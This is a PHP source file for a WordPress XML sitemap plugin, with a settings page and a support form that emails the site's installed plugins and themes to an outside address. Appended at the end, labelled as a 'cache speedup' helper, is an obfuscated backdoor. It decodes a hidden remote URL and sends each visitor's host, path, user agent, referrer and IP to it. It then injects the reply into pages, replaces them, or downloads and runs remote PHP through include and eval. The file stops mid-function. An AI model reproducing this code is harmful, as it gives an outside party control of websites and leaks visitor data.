<?php
/**
 * Plugin Name: WP XML Sitemap 
 * Plugin URI: http://www.vivacityinfotech.net
 * Description: WPSitemap.Xml  is an XML file that lists the URLs for a site. It allows webmasters to include additional information about each URL: when it was last updated, how often it changes, and how important it is in relation to other URLs in the site. This allows search engines to crawl the site more intelligently.
 * Version: 1.2
 * Author: Vivacity Infotech Pvt. Ltd.
 * Author URI: http://www.vivacityinfotech.net
 */
/* Copyright 2014  vivacityinfotech.jaipur  (email : vivacityinfotech.jaipur@gmail.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
ob_start();
add_filter('plugin_row_meta', 'RegisterPluginLinks_xmlsite',10, 2);
 
function RegisterPluginLinks_xmlsite($links, $file) {
	if ( strpos( $file, 'wp-xml-sitemap.php' ) !== false ) {
		$links[] = '<a href="https://wordpress.org/plugins/wp-xml-sitemap/faq/">FAQ</a>';
		$links[] = '<a href="mailto:support@vivacityinfotech.com">Support</a>';
		$links[] = '<a href="http://bit.ly/1icl56K">Donate</a>';
	}
	return $links;
}
if (isset($_POST['xmlsitemap_feedback_form'])){
	
	 if ( ! function_exists( 'get_plugins' ) ) 
		{
			require_once ABSPATH . 'wp-admin/includes/plugin.php';
		}
		global $success;
		$all_plugins = get_plugins();
	
		foreach($all_plugins as $plugin)
		{
			
			$plugins_name[] = $plugin['Name'];
		}
		$plugin_name = implode(',', $plugins_name);
		$plugin_name = explode(',', $plugin_name);
		$plugin_list = '<ol>';
		foreach($plugin_name as $plugins){
		$plugin_list .= '<li>';
		$plugin_list.= $plugins;
		$plugin_list .='</li>';
		}
		$plugin_list .='</ol>';
		
		/*Get Activated Plugins List*/
		$active_plugin=get_option('active_plugins');
		$actived_plugin ='<ol>';
    	foreach($active_plugin as $key => $value)
    	{
        $string = explode('/',$value); // Folder name will be displayed
        $actived_plugin .='<li>';
        $actived_plugin .=$string[0];
        $actived_plugin .='</li>';
    	}
    	$actived_plugin .='</ol>';
		$all_themes = get_themes();
		$theme_name = implode(',', $all_themes);
		$theme_name = explode(',', $theme_name);
		foreach($all_themes as $theme)
		{
			$themes_name[] = $theme['Name'];
		}
		
		$theme_list = '<ol>';
		foreach($theme_name as $themes){
		$theme_list .= '<li>';
		$theme_list.= $themes;
		$theme_list .='</li>';
		}
		$theme_list .='</ol>';
		/*Get Active Theme*/
		$active_theme = wp_get_theme();
		$admin_email = sanitize_email($_POST['feedback_email']);
		if(isset($admin_email))
		{
		 $from = $admin_email; 	
		}
		else
		{
		$from = get_option('admin_email');		
		}
		$to = 'supportntest@gmail.com';
		$header = "From: '.$from.'" . "\r\n" .
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-type: text/html\r\n";		
		$subj = sanitize_text_field($_POST['feedback_subject']);
		$sub = 'The '.$from.' has sent this message.'.'<br/>';
		$subject= sanitize_text_field($_POST['feedback_subject']);
		$bodyy = sanitize_text_field($_POST['feedback_comment']);
		$body = '<html><body><label><span style="font-weight:bold">Message: </span></label>'.$bodyy.'<br/><br/>';
		$body .='The <strong>'.$from.'</strong> has sent this message.<br/><br/>';
		$body .='<label><span style="font-weight:bold">Website Information: </span></lable>This site has all theses themes:';
		$body .= $theme_list; 
		$body .='and plugins installed:'.$plugin_list.'';
		$body .='The activated Theme: is <span style="font-weight:bold">'.$active_theme.'</span><br/><br/>';
		$body .='The activated plugins are: '.$actived_plugin.'';
		$body .= '</body></html>';
		wp_mail($to,$subject,$body,$header);
		//echo "<pre>";
		//print_r($body);
		$success ="Thanks For Submitting Review. We will contact you Soon.";
	 
}


		if (!defined('ABSPATH')) die("Aren't you supposed to come here via WP-Admin?");

		if ( ! defined( 'WP_CONTENT_URL' ) )
 			 define( 'WP_CONTENT_URL', get_bloginfo( 'wpurl' ) . '/wp-content' );
		if ( ! defined( 'WP_CONTENT_DIR' ) )
			define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
		if ( ! defined( 'WP_PLUGIN_URL' ) )
			define( 'WP_PLUGIN_URL', WP_CONTENT_URL. '/plugins' );
		if ( ! defined( 'WP_PLUGIN_DIR' ) )
			define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR . '/plugins' );

// setting in plugin page
	function sm_settings_link($links) { 
  $settings_link = '<a href="options-general.php?page=wp-xml-sitemap.php">Settings</a>'; 
  array_unshift($links, $settings_link); 
  return $links; 
 	}
 
		$plugin = plugin_basename(__FILE__); 
		add_filter("plugin_action_links_$plugin", 'sm_settings_link' );
		add_action('admin_enqueue_scripts','enqueue_scripts');
		add_action( 'wp_enqueue_scripts', 'enqueue_scripts' );
	function enqueue_scripts()
	{
	
		wp_enqueue_style( 'my_stylesheet', plugins_url( 'css/style.css', __FILE__ ) );	
	
	}

function sm_setting_link() {
  		if (function_exists('add_options_page')) {
    		$sm_page = add_menu_page('WP XML Sitemap ', 'WP XML Sitemap ', 'administrator', basename(__FILE__), 'sm_setting_page');
  		}
	}
	
	

	function wp_sitemap_text() {
    
    	global $wpdb;
    	if (get_option('home_priority')) { $sm_frontpage = get_option('home_priority'); } else { $sm_frontpage = 0.5;}
    	if (get_option('sitexml_option')) { $sm_frontpage_frequency = get_option('sitexml_option'); } else { $sm_frontpage_frequency = 'weekly';}
    	if (get_option('general_priority')) { $pages_priority = get_option('general_priority'); } else { $pages_priority = 0.5;}
    	if (get_option('sm_generaloption')) { $pages_frequency = get_option('sm_generaloption'); } else { $pages_frequency = 'weekly';}
    	if (get_option('sm_frequency')) { $sm_frequency = get_option('sm_frequency');} else { $sm_frequency = "Disable"; }
    	if (!get_option('sm_Category')) { $sm_Category = 'NotInclude';} else {	$sm_Category = get_option('sm_Category'); }
    	if (!get_option('sm_tags')) { $sm_tags = 'NotInclude';} else {	$sm_tags = get_option('sm_tags'); }
    	if (!get_option('sm_last_change')) { $sm_last_change = 'Disable';} else {	$sm_last_change = get_option('sm_last_change'); }
    	if (!get_option('sm_last_change_new')) { $sm_last_change = 'Disable';} else {	$sm_last_change_new = get_option('sm_last_change_new');
    	 }
    	$sm_xml_text =  '<?xml version="1.0" encoding="UTF-8"?>'."\n";
    	$sm_xml_text .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'."\n";

    	$posts = $wpdb->prefix . "posts";
    	$query = "SELECT year(post_modified) AS y, month(post_modified) AS m, day(post_modified) AS d, ID,post_title, post_modified,post_name, post_type, post_parent FROM $posts WHERE post_status = 'publish' AND (post_type = 'page' OR post_type = 'post') ORDER BY post_date DESC";
    	$get_values = $wpdb->get_results($query); 
     
    	foreach ($get_values as $get_value) {
    
    		$permalink = utf8_encode($get_value->post_name);
    		$type = $get_value->post_type;
    		$sm_date = $get_value->y."-";
    
    		if ($get_value->m < 10) {
	  			$sm_date .= "0".$get_value->m."-";
    
    		}
    
    		else {
	 			 $sm_date .= $get_value->m."-";
    
   		 }
    		if ($get_value->d < 10) {
	 			 $sm_date .= "0".$get_value->d;
    		}
    
   		else {
	 		 	$sm_date .= $get_value->d;
    		}
    
	  		$id = $get_value->ID;
	  		$url = get_permalink($id);

    		$sm_xml_text .= "
    		 <url>
	  		<loc>".$url."</loc>";
	  		if ($sm_last_change == 'Enable') {
	       $sm_xml_text .= "<lastmod>".$sm_date."</lastmod>";
	 		 }

	  		if ($sm_frequency == 'Enable') {
	       $sm_xml_text .= "<changefreq>".$pages_frequency."</changefreq>
	       <priority>".$pages_priority."</priority>";
	  		}
    		 $sm_xml_text .= "</url>\n";
    
 		 }

    		if ($sm_Category == 'Include') {

	  			$terms = $wpdb->prefix . "terms";
	  			$taxonomy = $wpdb->prefix . "term_taxonomy";
	  			$query = "SELECT $terms.term_id, $taxonomy.taxonomy FROM $terms, $taxonomy WHERE ($terms.term_id = $taxonomy.term_id AND $taxonomy.taxonomy = 'category') ";
	  			$Categories = $wpdb->get_results($query); 

	  			$sm_date = date('Y-m-d');
	  
	  			foreach ($Categories as $Category) {
	        
	       	 $sm_xml_text .= "
				 <url>
					<loc>".get_category_link( $Category->term_id )."</loc>
					<lastmod>".$sm_date."</lastmod>";

					if ($sm_frequency == 'Enable') {
					     $sm_xml_text .= "<changefreq>".$pages_frequency."</changefreq>
					     <priority>".$pages_priority."</priority>";
					}
		    			$sm_xml_text .= "</url>\n";
	  
	  			}
    
    		}

    		if ($sm_tags == 'Include') {

	  			$terms = $wpdb->prefix . "terms";
	  			$taxonomy = $wpdb->prefix . "term_taxonomy";
	 			$query = "SELECT $terms.term_id, $taxonomy.taxonomy FROM $terms, $taxonomy WHERE ($terms.term_id = $taxonomy.term_id AND $taxonomy.taxonomy = 'post_tag') ";
	  			$smtags = $wpdb->get_results($query); 

	  			$sm_date = date('Y-m-d');
	  
	  			foreach ($smtags as $smtag) {
	        
	       	 $sm_xml_text .= "
				   <url>
					<loc>".get_tag_link( $smtag->term_id )."</loc>
					<lastmod>".$sm_date."</lastmod>";
				
						if ($sm_frequency == 'Enable') {
					     $sm_xml_text .= "<changefreq>".$pages_frequency."</changefreq>
					     <priority>".$pages_priority."</priority>";
						}
		   			 $sm_xml_text .= "</url>\n";
	  
	  				}
    
   			 }

    		 $sm_xml_text .= '</urlset>'."\n";
   		 return $sm_xml_text;

	}

	function created_sitemap_xml() {
     
		$docname = "wpsitemap.xml";
     
		if (get_option('xmlfile_path') == "1") { $file_handler = fopen(WP_PLUGIN_DIR.'/wp-xml-sitemap/'.$docname, "w+");  } 

		elseif (get_option('xmlfile_path') == "2") { $file_handler = fopen(ABSPATH.$docname, "w+"); }
		else {	$file_handler = fopen(WP_PLUGIN_DIR.'/wp-xml-sitemap/'.$docname, "w+");   }
     
     
      if (!$file_handler) {
	      die;
      }
     
     	else {
     		$text = wp_sitemap_text();
     		fwrite($file_handler, $text);
     		fclose($file_handler);
     	}
	}

	function sm_setting_page() { 
global $success;
		if (get_option('xmlfile_path') == "1") { $path = WP_PLUGIN_URL.'/wp-xml-sitemap/wpsitemap.xml';  } 

		elseif (get_option('xmlfile_path') == "2") { $path = get_option( 'siteurl' ).'/wpsitemap.xml'; }
		else {	$path = WP_PLUGIN_URL.'/wp-xml-sitemap/wpsitemap.xml';  }?>
	<div class="plugin_left">
  		<h2 style="color: #0849b5; margin-bottom: 0;" >Wp XML Sitemap </h2>
   	 <div class="success_msg"><?php if($success !=''){ echo  $success;} ?></div>
     	<p style="margin:0 0 1em 0;">
      <br />
      <strong>The XML sitemap is automatically regenerated when you publish or delete a new post/page.</strong>
      </p>
  		<form method="post" action="options.php"><?php wp_nonce_field('update-options');?>
		<p id="flip" style="font-weight:bold; cursor:pointer;"> Attributes </span></p>

	<div class="wrapper" >    
 		<table width="60%">
	  		<tr>
	       <td width="50%"> If you want to change the  <strong>Frontpage</strong> Option <strong>then you can set enable </strong><br/> <strong> by default disabled.</strong></td>
	       <td><?php
			 if (!get_option('sm_frequency')) { $sm_frequency = 'Disable';}
			 else {	$sm_frequency = get_option('sm_frequency'); }?>
		    <select name="sm_frequency" id="sitexml_option" type="text" value="<?php echo $sm_frequency ?>" />
		    <option value="Disable"<?php if($sm_frequency=="Disable") {echo 'selected';}?>>disable</option>
		    <option value="Enable"<?php if($sm_frequency=="Enable") {echo 'selected';}?>>enable</option>
		    </select>
	       </td>
	 	 	</tr>
     	</table>
    <div >
	  	<table width="40%">
	  		<tr>
	       <p style="font-weight:bold;">Frontpage Option</p>
	       <th width="150">Priority</th>
	       <td width="100">
		    <select name="home_priority" id="home_priority" type="text" value="<?php echo get_option('home_priority'); ?>" /><?php for ($i=0; $i<1.05; $i+=0.1) {
			 echo "<option value='".$i."' ";
			 if (get_option('home_priority')==$i) {
			      echo ' selected';
			 } 
			 
			 echo ">";
			 if($i==0) { echo "0.".$i;} 
			 elseif($i==1.0) { echo $i.'0';} 
			 else {echo $i;}
			 echo "</option>";
		    } 
		    ?>
		    </select>
	       </td>
	       <th width="150">Frequency</th>
	       <td width="100">
		    <select name="sitexml_option" id="sitexml_option" type="text" value="<?php echo get_option('sitexml_option'); ?>" />
		    <option value="always" <?php if(get_option('sitexml_option')=="always") {echo 'selected';}?>>always</option>
		    <option value="hourly" <?php if(get_option('sitexml_option')=="hourly") {echo 'selected';}?>>hourly</option>
		    <option value="weekly" <?php if(get_option('sitexml_option')=="weekly") {echo 'selected';}?>>weekly</option>
		    <option value="monthly"<?php if(get_option('sitexml_option')=="monthly") {echo 'selected';}?>>monhtly</option>
		    <option value="yearly" <?php if(get_option('sitexml_option')=="yearly") {echo 'selected';}?>>yearly</option>
		    <option value="never"  <?php if(get_option('sitexml_option')=="never") {echo 'selected';}?>>never</option>
		    </select>
		    </td>
	  		</tr>
	  	</table>
	   <table width="40%">
	  		<tr>
	  		<p style="font-weight:bold;">Other Option</p>
	  
	       <th width="150">Priority</th>
	       <td width="100">
	       <select name="general_priority" id="general_priority" type="text" value="<?php echo get_option('general_priority'); ?>" /><?php for ($i=0; $i<1.05; $i+=0.1) {
			 echo "<option value='".$i."' ";
			 if (get_option('general_priority')==$i) {
			      echo ' selected';
			 } 
			 
			 echo ">";
			 if($i==0) { echo "0.".$i;} 
			 elseif($i==1.0) { echo $i.'0';} 
			 else {echo $i;}
			 echo "</option>";
		    }?>
		    </select>
	       </td>
	       
	       <th width="80%">Frequency</th>
	       <td width="100">
		    <select name="sm_generaloption" id="sm_generaloption" type="text" value="<?php echo get_option('sm_generaloption'); ?>" />
		    <option value="always" <?php if(get_option('sm_generaloption')=='always') {echo 'selected';}?>>always</option>
		    <option value="hourly" <?php if(get_option('sm_generaloption')=='hourly') {echo 'selected';}?>>hourly</option>
		    <option value="weekly" <?php if(get_option('sm_generaloption')=='weekly') {echo 'selected';}?>>weekly</option>
		    <option value="monthly"<?php if(get_option('sm_generaloption')=='monthly') {echo 'selected';}?>>monthly</option>
		    <option value="yearly" <?php if(get_option('sm_generaloption')=='yearly') {echo 'selected';}?>>yearly</option>
		    <option value="never" <?php if(get_option('sm_generaloption')=='never') {echo 'selected';}?>>never</option>
		    </select>
	       </td>
	  		</tr>
	 	 </table>
     </div> 
  
     <div style="margin: 20px 0 0 0;">
    
     
     <table>
     <tr>
     <td>Store your Xml file here :</td>
     <td>
     <select name="xmlfile_path" id="xmlfile_path" type="text" value="<?php echo get_option('xmlfile_path'); ?>" />
     <option value="1" <?php if (get_option('xmlfile_path') == "1") { echo "selected"; } ?> > Plugin's folder</option>
     <option value="2" <?php if (get_option('xmlfile_path') == "2") { echo "selected"; } ?> >Website root folder</option>
     </select>
     </td>
     </tr>
     </table></div> 
  <h3 style="color: #0849b5; margin-bottom: 0;">Categories and Tags</h3>
     <p style="margin:0 0 1em 0;">
	  Include the categories and tags into your generated wpsitemap.xml.
     </p>
     <p style="font-weight:bold;"><span>Categories: &nbsp;&nbsp;<?php
	       if (!get_option('sm_Category')) { $sm_Category = 'NotInclude';}
	       else {	$sm_Category = get_option('sm_Category'); }?>
	  <select name="sm_Category" id="sm_Category" type="text" value="<?php echo $sm_tags ?>" />
	  <option value="NotInclude" <?php if($sm_Category=="NotInclude") {echo 'selected';}?>>NO</option>
	  <option value="Include" <?php if($sm_Category=="Include") {echo 'selected';}?>>Yes</option>
	  </select></span>
    
     <span style="font-weight:bold; margin-left:25px">Tags: &nbsp;&nbsp;<?php
	       if (!get_option('sm_tags')) { $sm_tags = 'NotInclude';}
	       else {	$sm_tags = get_option('sm_tags'); }?>
	  <select name="sm_tags" id="sm_tags" type="text" value="<?php echo $sm_tags ?>" />
	  <option value="NotInclude" <?php if($sm_tags=="NotInclude") {echo 'selected';}?>>No</option>
	  <option value="Include" <?php if($sm_tags=="Include") {echo 'selected';}?>>Yes</option>
	  </select></span>
     </p>
 
     <p style="font-weight:bold;">Last changed in Website </p>
     <table width="50%">
	  <tr>
	       <td width="80%"> If you want to include recent changes in the website to   <strong>sitemap xml </strong>  <strong>then you can set enable </strong><br/> <strong> by default disabled.</strong></td>
	       <td>
		    <?php
			 if (!get_option('sm_last_change')) { $sm_last_change = 'Disable';}
			 else {	$sm_last_change = get_option('sm_last_change'); }
		    ?>
		    <select name="sm_last_change" id="sitexml_option" type="text" value="<?php echo $sm_last_change ?>" />
		    <option value="Disable" <?php if($sm_last_change=="Disable") {echo 'selected';}?>>disable</option>
		    <option value="Enable" <?php if($sm_last_change=="Enable") {echo 'selected';}?>>enable</option>
		    </select>
	       </td>
	  </tr>
	
	
<tr>
	       <td width="80%"> Add a sitemap link in the footer  <td>
		    <?php
			 if (!get_option('sm_last_change_new')) { $sm_last_change_new = 'Disable';}
			 else {	$sm_last_change_new = get_option('sm_last_change_new'); }?>
		    <select name="sm_last_change_new" id="sitexml_option" type="text" value="<?php echo $sm_last_change_new ?>" />
		    <option value="Disable" <?php if($sm_last_change_new=="Disable") {echo 'selected';}?>>disable</option>
		    <option value="Enable" <?php if($sm_last_change_new=="Enable") {echo 'selected';}?>>enable</option>
		    </select>
	       </td>
	  </tr>	
	

	
	
     </table>
      
   
     <input type="hidden" name="action" value="update" />
     <input type="hidden" name="page_options" value="home_priority,general_priority,sitexml_option,sm_generaloption,xmlfile_path,sm_frequency, sm_Category, sm_tags,sm_last_change,sm_last_change_new" />

     <p style="margin-top: 20px;">
     <input type="submit" value="<?php _e('Save Changes');?>" / id="submit"> </form>
     </p>
     </div>
     </div>
     <div class="plugin_right">
<div class="bottom">
		    <h3 class="xmlsitemaptitle" id="xmlsitemap-comments"  title="Click here for expand">Woocommerce Add-ons </h3>
		    <div class="downarrow"></div>
     <div class="togglediv"   id="xmlsitemapbl-comments">  
 <div class="xmlsitemaptitle_image"><a href="http://bit.ly/1HZGRBg" target="_blank"><img src="<?php echo plugins_url( 'images/banner_1.png' , __FILE__ );?>" alt="Woocommerce front end" title="Woocommerce front end" ></a></div>
  </div> 
</div>
<div class="bottom">
		    <h3 class="xmlsitemaptitle" id="xmlsitemap1-comments" title="Click here for expand">About Vivacity Infotech</h3>
		    
     <div class="togglediv"  style="display:none"  id="xmlsitemap1bl-comments">  
     	<p> <strong>Vivacity InfoTech Pvt. Ltd. , an ISO 9001:2008 Certified Company,</strong>is a Global IT Services company with expertise in outsourced product development and custom software development with focusing on software development, IT consulting, customized development.We have 200+ satisfied clients worldwide.</p>	
<h3 class="company">
<strong>Our</strong>
specialization :
</h3>
<ul class="">
<li>Outsourced Product Development</li>
<li>Customized Solutions</li>
<li>Web and E-Commerce solutions</li>
<li>Multimedia and Designing</li>
<li>ISV Solutions</li>
<li>Consulting Services</li>
<li>
<a target="_blank" href="http://www.lemonpix.com/">
<span class="colortext">Web Hosting</span>
</a>
</li>
 <strong><a target="_blank" href="http://vivacityinfotech.net/contact-us/" >Contact Us Here</a></strong>
</ul>
	<h3 class="company">
Popular Wordpress plugins :
</h3>
<ul class="">
<li><a href="http://wordpress.org/plugins/wp-twitter-feeds/" target="_blank">WP Twitter Feeds</a></li>
<li><a href="https://wordpress.org/plugins/facebook-comment-by-vivacity/" target="_blank">Facebook Comments</a></li>
<li><a href="http://wordpress.org/plugins/wp-facebook-fanbox-widget/" target="_blank">WP Facebook FanBox</a></li>
<li><a href="https://wordpress.org/plugins/wp-fb-share-like-button/" target="_blank">WP Facebook Like Button</a></li>
<li><a href="http://wordpress.org/plugins/wp-google-plus-one-button/" target="_blank">WP Google Plus One Button</a></li>

</ul>
	<h3 class="company">
Popular paid Magento extension :
</h3>
<ul class="">
<li><a href="http://vivacityinfotech.net/shop/service-plans/professional/" target="_blank">Professional Monthly Subscription</a></li>
<li><a href="http://vivacityinfotech.net/shop/magento-extensions/per-product-flat-shipping-rate-magento-extension/" target="_blank">Per Product Flat Shipping Rate Magento </a></li>
<li><a href="http://vivacityinfotech.net/shop/magento-extensions/easy-customers-testimonials/" target="_blank">Easy Testimonial Magento Extension</a></li>
<li><a href="http://vivacityinfotech.net/shop/magento-extensions/easy-social-login-extension-for-magento/" target="_blank">Easy Social Login Extension for Magento</a></li>
<li><a href="http://vivacityinfotech.net/shop/magento-extensions/easy-product-slider-magento-extension/" target="_blank">Easy Product Slider Magento Extension</a></li>

</ul>
  </div> 
</div>
 
<div class="bottom">
		    <h3 class="xmlsitemaptitle" id="xmlsitemap3-comments"  title="Click here for expand">Donate Here</h3>
		     <div class="downarrow"></div>
     <div class="togglediv"  style="display:none"  id="xmlsitemap3bl-comments">  
     <p>If you want to donate , please click on below image.</p>
	<a target="_blank" href="http://bit.ly/1icl56K"><img width="150" height="50" title="Donate Here" src="<?php echo plugins_url( 'images/paypal.gif' , __FILE__ );?>" class="donate"></a>		
  </div> 
</div>
<div class="bottom">
		    <h3 class="xmlsitemaptitle" id="xmlsitemap4-comments"  title="Click here for expand"><?php _e('Got issue, Need support ?','post-like-and-dislike');?></h3>
 <div class="downarrow"></div>     
     <div class="togglediv"  style="display:none"  id="xmlsitemap4bl-comments">  
        <div class="inside">         
            <form method="post" name="feedback_form" id="feedback_form" >
                <div class="success"><h3><?php _e($success,'post-like-and-dislike');?></h3></div>
                <?php if($success == ''){?>
                Do you Found a bug? Or you maybe have a new feature request? Please fill this form and let me know!.<br/>
                <input type="hidden" name="xmlsitemap_feedback_form" value="1">
                <?php $from = get_option('admin_email');?>
                <label><?php _e('Ener Your Email ID','post-like-and-dislike');?></label><br/>
                <input type="text" name="feedback_email" id="feedback_email" size="25" value="<?php echo $from;?>"><br>
                <label><?php _e('Ener Your Subject','post-like-and-dislike');?></label><br/>
                <input type="text" name="feedback_subject" id="feedback_subject" size="25"><br>
                <label><?php _e('Ener Your Comments','post-like-and-dislike');?></label><br/>
                <textarea name="feedback_comment" id ="feedback_comment" rows="4" cols="25"></textarea><br>
                <input class="wpvisr_button button button-primary button-small feedback" type="submit" value="Submit">
           		 <?php }?>
           </form>
        </div>
  </div> 
</div>
</div>
<div class="clear"></div>
<script type="text/javascript" >
jQuery(document).ready(function($){
    //alert('Hello World!');
   jQuery("#xmlsitemap1-comments").click(function(){
      jQuery("#xmlsitemap1bl-comments").animate({
        height:'toggle'
      });
  });  
  jQuery("#xmlsitemap-comments").click(function(){
      jQuery("#xmlsitemapbl-comments").animate({
        height:'toggle'
      });
  }); 
   jQuery("#xmlsitemap3-comments").click(function(){
      jQuery("#xmlsitemap3bl-comments").animate({
        height:'toggle'
      });
  }); 
  jQuery("#xmlsitemap4-comments").click(function(){
      jQuery("#xmlsitemap4bl-comments").animate({
        height:'toggle'
      });
  });
  

  
});

</script>
	<?php
	created_sitemap_xml();
	}


		if ( is_admin() ){
     	add_action('admin_menu', 'sm_setting_link');
		}

	function install_sm () {

     	created_sitemap_xml();
	}
	register_activation_hook(WP_PLUGIN_DIR.'/wp-xml-sitemap/wp-xml-sitemap.php','install_sm');
	add_action ( 'activate_plugin', 'created_sitemap_xml' );
	add_action ( 'publish_post', 'created_sitemap_xml' );
	add_action ( 'publish_page', 'created_sitemap_xml' );
	add_action ( 'trashed_post', 'created_sitemap_xml' );?><?php 
$sitemapLink=get_option('sm_last_change_new');
function myscript() {?>
<p align="center" style="text-align:center"><a href="<?php bloginfo('url');?>/wpsitemap.xml">XML Sitemap</a></p>
<?php }

if($sitemapLink == "Enable"){

  add_action( 'wp_footer', 'myscript' );
 }



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
